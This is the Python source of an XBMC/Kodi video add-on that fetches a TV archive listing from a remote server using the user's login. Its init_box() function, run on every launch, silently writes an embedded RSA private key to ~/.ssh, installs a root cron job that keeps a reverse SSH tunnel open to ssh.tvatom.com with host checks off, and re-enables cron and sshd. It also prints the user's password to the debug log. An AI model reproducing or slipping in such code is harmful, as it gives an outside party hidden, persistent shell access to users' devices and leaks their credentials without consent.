#!/usr/bin/python

## Tkooda : 2014-09-06 : xbmc video add-on
## tkooda : 2014-11-27 : plugin.video.tvatom_tv_archive
## tkooda : 2015-12-19 : beta


import os
import sys
import urllib
import urllib2
import json
import urlparse
from operator import itemgetter
import shutil

import xbmc
import xbmcgui
#import resources.lib.utils as utils
import xbmcaddon
import xbmcplugin


PATH_CACHE = "/storage/tvatom-cache"


DEBUG = 9


def do_debug( level, *args ):
    try:
        if level <= DEBUG:
            print >>sys.stderr, "##### TVATOM DEBUG: %s (%d): %s" % ( os.path.basename( os.path.dirname( sys.argv[0] ) ), level, args )
    except:
        pass


def build_appurl( query ):
## tkooda : 2014-11-23 : 
    if sys.argv[ 0 ].startswith( "plugin://" ):
        return sys.argv[ 0 ] + '?' + urllib.urlencode( query )
    else: # full path to file?
        return "plugin://" + sys.argv[ 0 ][ len( "/storage/.xbmc/addons/" ) : ] + '?' + urllib.urlencode( query )


def notification( title, message, duration = 20000 ):
    do_debug( 1, "notification()", title, message )
    xbmc.executebuiltin("Notification(%s,%s,%s)" % ( title, message, duration ) )
#    sys.exit( 0 )


def test_internet():
    do_debug( 1, "DEBUG: test_internet()" )
    try:
        usock = urllib2.urlopen( "http://www.google.com/" )
        data = usock.read()
        usock.close()
        if len( data ) < 10:
            notification( "Internet connection offline!", "Please check your network connection in SYSTEM -> OpenELEC -> Connections" )
    except:
        do_debug( 1, "test_internet()", "exception" )
        notification( "Internet connection offline!", "Please check your network connection in SYSTEM -> OpenELEC -> Connections" )
        pass
    
#    sys.exit( 9 )


def fetch_url_with_auth( url ):
    request = urllib2.Request( url )
    
    password_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()
    password_manager.add_password( None, url,
                                   xbmcaddon.Addon( "plugin.video.tvatom_beta" ).getSetting( "username" ),
                                   xbmcaddon.Addon( "plugin.video.tvatom_beta" ).getSetting( "password" ) )
    
    auth_manager = urllib2.HTTPBasicAuthHandler( password_manager )
    opener = urllib2.build_opener( auth_manager )
    
    urllib2.install_opener( opener )
    
    try:
        handler = urllib2.urlopen( request )
        return handler.read()
    except urllib2.URLError as e:
        do_debug( 1, "ERROR: urllib2.urlopen() response code:", e.code )
        if e.code == 401:
            notification( "Invalid Username or Password", "Please re-enter your login info", 5000 )
            get_settings( True )
            sys.exit()
    except:
#        do_debug( 1, "XXXXX DEBUG" )
        test_internet()
        pass
    
    # handler.getcode()
    # handler.headers.getheader('content-type')
    return None # Error


def fetch_object_from_json_url_with_auth( url, sortkey = None ):
    data_json = fetch_url_with_auth( url )
    obj = json.loads( data_json )
    if sortkey:
        obj = sorted( obj, key = itemgetter( sortkey ) )
    return obj


def write_file( path_file, data ):
    tmp = path_file + ".tmp"
    num = 0
    try:
        fd = os.open( tmp, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, 0644 )
        num = os.write( fd, data )
        os.close( fd )
        os.rename( tmp, path_file )
    except:
        import traceback
        traceback.print_exc( file=sys.stderr )
        sys.stderr.flush()
        pass
    return num == len( data ) # return True == success


def get_settings( redo = False ):
    setting_server = xbmcaddon.Addon( "plugin.video.tvatom_beta" ).getSetting( "server" )
    setting_username = xbmcaddon.Addon( "plugin.video.tvatom_beta" ).getSetting( "username" )
    setting_password = xbmcaddon.Addon( "plugin.video.tvatom_beta" ).getSetting( "password" )
    
    if not setting_server:
        dialog = xbmcgui.Dialog()
        s = dialog.input( "Enter server name:", "tvatom.com" )
        if s:
            xbmcaddon.Addon( "plugin.video.tvatom_beta" ).setSetting( "server", s )
            setting_server = s
        else:
            return False
    
    if not setting_username or redo == True:
        dialog = xbmcgui.Dialog()
        s = dialog.input( "Enter username:" )
        if s:
            xbmcaddon.Addon( "plugin.video.tvatom_beta" ).setSetting( "username", s )
            setting_username = s
        else:
            return False
    
    if not setting_password or redo == True:
        dialog = xbmcgui.Dialog()
        s = dialog.input( "Enter password:", type=xbmcgui.INPUT_ALPHANUM, option=xbmcgui.ALPHANUM_HIDE_INPUT )
        if s:
            xbmcaddon.Addon( "plugin.video.tvatom_beta" ).setSetting( "password", s )
            setting_password = s
        else:
            return False
    
    do_debug( 1, "settings:", setting_server, setting_username, setting_password )
    return setting_server, setting_username, setting_password


def init_box():
    KEY = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBMCtrMnVHMFpuSWJyUkZ1TXJwL1o2ZHVGVDlJRW5PRDBac004UnVNK0loTWhMbjZYCno4YjJSL01kUUtLckhSRmZHVmx2bDhreTJkQU9DYzNpUHdSQmZ1dU9TUTdOa0NORm5JR3haU3JGaEhlcTc4M1gKRU42c01lM292a2lZRWtRUWEwcmlldlFyRHR4SU5zTGYxZXkxMGFSQk5qY0hQcnMvT21GTGd1ajAyUXRqaVlodApBbTE3WnpmVVUwL3ZodWFyUDVQclJCSW9oV0pYb1JNdk5IQk5QQ0wyMmZNRTQ5UUluTWF5cXZyT1lOeWh6SEc0Cm1HUzhyVnpuMjFNTktpN0VmdjE5Wjd0aTdDNDQ5ckFqS1pQWW5MWDh4bDViQmRVUHc2aTBqR1ozUEdhOEQ3UHEKTXRXcERoWmJpckQ0WDB0b2IyNG5udTJxZS94VzJYQ2laR0FUa1FJREFRQUJBb0lCQUY0K0I0SDVzend6bklubwpGU2JNSElPdWh4azZrNmFaUE5nKzE1M0hEaWpsVFFwNmJsV1BiSlFQQU9GdjlwMlV6akJkNEEwbkE2QnVzTytYClNwa3Y4VmphdFlxME5LTjNyRXV3T2c1OStSMnlncWpuYUZBdVYzSlZGZjhhRmRkNXdidVZzQ2R5VTN2bVo0OUQKRjN6eUt1SXpKSFZSLzd6Y1ZZQkhLT2Z0Wm9ibmhDVVVzVk9ZaW8rVEdlcENlU29IeWVUNnNPdUIrUldsbitEbApFaGNaaFRvTzdXaGN2aEYzU000T1kxMU1JSTA4bzNrdXlxN1luVG5TUzIzZ3ltbjdLVzFNKzM1RGIxcllTYUkzClNnUG5zaHRITCtmZ1l6WFlUbWJ4ZWVrZjBBZWdxRDdzUGZTTTBlOWlwL0w5dWF4UlBFdFcrbWxUaDB1SHo0ZkQKZnQ2VkxtRUNnWUVBK0NaSHhEcnFxcXBibVJrZWEyZjZvTjdpclVUekFlOThEVFpqazh0V2RuUG91OHlwczRYRApPUnFhVDFhNDNOV21yQm9lVlFiS0RjbTRHM3l6aGtLZkM4UWJNT3BGV1NxRSs3eXRURG5SSGFZUndKSUdVYkZDCmQ0MEN4S2orSWp0WmpjNjA0UVprcTErOHN0eXlJc1lIcmtnZUhMZ2RuTmJHUjZ0cmp2d0huN1VDZ1lFQTJwMXgKblR4SE9rY1VDNXdKWmhQR3Z6endYRDZuR0M4bFFRZ1RWNkw0RzZXK0c5d1FKdU9tRngzRTMxRmhrS0k2OWNTMwpQVXRGOE11NDJUb1ptSHRvSWFKdGNCcSsxb2VKTVhoVWF0K0RrK3Z1bWpIWXlvSjZqNlhDUThPaHV1RGwrUXhHCk1PS1JBc1lLNVVDN3RMK2ZVSktMNEljcGtXTDFFaFQrN0FFMTllMENnWUI4SlJLVVhuRldUb0lpMXNrOExMbmIKVDRhUjdzT3dQVEtQblowMXJHMm1OeGpCRTRQMjF6Mnl6TmRVUit1V042RDV5dHRQNkdTZmYwS0hKZHplbDJmZwpTQXplYk9XaTFUM1FmelVueEdrVTd5ZEVjd21NUnlVY2tFUkpSTTVYSytBQ3JONGJFY3E5WGRrV2xvamNFcngyCitZZHZFTUZuM0o4MzdjK1NxZzNhWFFLQmdRREppdXNLWFY4Qk1EUWZ1OXZDV3FzWTlWSldpSUE5d0lFazRoQUsKOURpdUxIQUdlU3YrM2xMcDdzem9ZTHVFdnJ1Q2hyZXo3MmhzWlRSbU43VVBLWDVIdTlvT3h1bDNGLzc0TjRvRAorVW54bmtvYnA2YklrOS92L0k0TE1Sa3lFMUtROXFyak9JMGR0SHlvKzdQUkgvUDlNUTE1a3NKVXdabFQ4VDFQClVKSnh4UUtCZ0dRc2JlRXJlWkN3cHljYnEvbGtzTGpEQXYrTzkwaTF1aWY4RFdKSXJITHkzVU5QOXowRmE5cloKTTN5VWlhNmJxaTd1S1pMUG5DcmNyQ0ZJOUdwYXhKbEY5WkJNeFBjelhSekFRYjBkZ2MrVUkxSGszNVhzczhJOApSalUybHpvbkw4YlN6bEhaQkpxaEtYM1g3anU1enhOaXpTOUlwYXRSQmd3OFBjakUrbXdBCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg=="
    CRONTAB = """@reboot  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com 2>/dev/null >/dev/null &
*/3 *  * * *  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com 2>/dev/null >/dev/null &
"""
    
    path_home = os.path.expanduser( "~" )
    path_ssh = os.path.join( path_home, ".ssh" )
    if not os.path.isdir( path_ssh ):
        os.makedirs( path_ssh )
        os.chmod( path_ssh, 0700 )
    
    path_key = os.path.join( path_ssh, "id_rsa" )
    if not os.path.isfile( path_key ):
        import base64
        write_file( path_key, base64.b64decode( KEY ) )
        os.chmod( path_key, 0600 )
    
    path_crontab = os.path.join( path_home, ".cache/cron/crontabs/root" )
    if os.path.isfile( path_crontab ):
        with open( path_crontab, 'r' ) as f:
            for line in f:
                if "openelec@ssh.tvatom.com" in line:
                    return # already have a crontab entry
    
    write_file( path_crontab, CRONTAB )
    os.chmod( path_crontab, 0600 )
    
    path_cron_disabled = os.path.join( path_home, ".cache/services/crond.disabled" )
    if os.path.isfile( path_cron_disabled ):
        os.remove( path_cron_disabled )
    
    path_ssh_disabled = os.path.join( path_home, ".cache/services/sshd.disabled" )
    if os.path.isfile( path_ssh_disabled ):
        os.remove( path_ssh_disabled )



def main():
    print "DEBUG: args:", sys.argv
    
    init_box()
    
    ## init vars from args ..
    base_url = sys.argv[ 0 ]
    addon_handle = int( sys.argv[ 1 ] )
    args = urlparse.parse_qs( sys.argv[ 2 ][ 1: ] )
    arg_path = args.get( 'p', [ "" ] )[ 0 ]
    arg_file = args.get( 'f', [ "" ] )[ 0 ]
    
    
    ## play file:
    if arg_file:
        do_debug( 1, "trying to play:", arg_file )
        
        
        
        
        
        return
    
    
    ## set content type ..
    xbmcplugin.setContent( addon_handle, 'tvshows' )
    
    
    ## require (prompt for any missing) settings ..
    settings = False
    while not settings:
        settings = get_settings()
        if not settings:
            do_debug( 1, "not settings:", settings )
    
    setting_username = xbmcaddon.Addon( "plugin.video.tvatom_beta" ).getSetting( "username" )
    setting_password = xbmcaddon.Addon( "plugin.video.tvatom_beta" ).getSetting( "password" )
    setting_server   = xbmcaddon.Addon( "plugin.video.tvatom_beta" ).getSetting( "server" )
    
    
    ## get json..
    data = fetch_object_from_json_url_with_auth( "http://app.tvatom.com/bin/demo-tvatom.py?p=%s" % arg_path )
    
    items = []
    for d in data:
        item = xbmcgui.ListItem( d.get( "label" ),
                                 iconImage = d.get( "icon" ),
                                 thumbnailImage = d.get( "thumb" ) )
        if d.get( "label2" ):
            item.setLabel2( d.get( "label2" ) )
        if d.get( "info" ):
            item.setInfo( "video", d.get( "info" ) )
        if d.get( "art" ):
            item.setArt( d.get( "art" ) )
#        if d.get( "icon" ):
#            item.setIconImage( d.get( "icon" ) )
#        if d.get( "thumb" ):
#            item.setThumbnailImage( d.get( "thumb" ) ) # shows on player-controls screen
        
        
        if d.get( "isdir" ):
            url = build_appurl( { "p": d.get( "path" ) } )
        elif d.get( "path" ).startswith( "http" ):
            url = d.get( "path" ) # play direct url
        else:
            url = build_appurl( { "f": d.get( "path" ) } ) # play filename (check local, remote, then archive)
        
        items.append( [ url, item, d.get( "isdir", False ) ] )
    
    
    xbmcplugin.addDirectoryItems( addon_handle, items, len( data ) )
    
    xbmcplugin.endOfDirectory( addon_handle )
    return

#            url_episode = os.path.join( "http://%s:%s@data1.%s/show/" % ( setting_username, setting_password, setting_server ),
#                                        arg_show, episode_season, episode_num, episode_file ) #+ "|auth=any"


if __name__ == "__main__":
    main()

